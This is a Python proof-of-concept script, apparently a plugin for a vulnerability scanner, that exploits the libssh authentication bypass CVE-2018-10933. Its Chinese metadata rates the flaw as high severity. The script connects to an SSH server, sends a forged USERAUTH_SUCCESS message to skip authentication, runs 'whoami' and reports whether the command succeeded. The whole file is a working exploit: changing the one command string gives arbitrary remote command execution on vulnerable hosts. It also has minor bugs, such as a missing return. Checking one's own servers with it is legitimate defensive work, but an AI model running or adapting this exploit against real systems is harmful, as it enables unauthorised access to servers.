#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import paramiko
import re
import socket

def get_plugin_info():
    plugin_info = {
        "name": "libssh 认证绕过",
        "desc": "导致敏感信息泄露，严重情况可导致服务器被入侵控制。",
        "grade": "高",
        "type": "service",
        "keyword": "service:ssh cve:cve-2018-10933 tag:libssh port:22"
    }
    return plugin_info

def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':22'
    host,port = check_port(arg).split(':')
    timeout = 5
    cmd = "whoami"
    sock = socket.socket()
    sock.settimeout(timeout)
    try:
        sock.connect((host, int(port)))
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
        remote_version = transport.remote_version
        spawncmd = transport.open_session(timeout=6)
        spawncmd.exec_command(cmd)
        output = ""
        try:
            out = spawncmd.makefile("rb", 2048)
            output = str(out.read())
            out.close()
        except:
            pass
        if spawncmd.recv_exit_status() == 0:
            return True
        else:
            False
    except Exception:
        return 

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

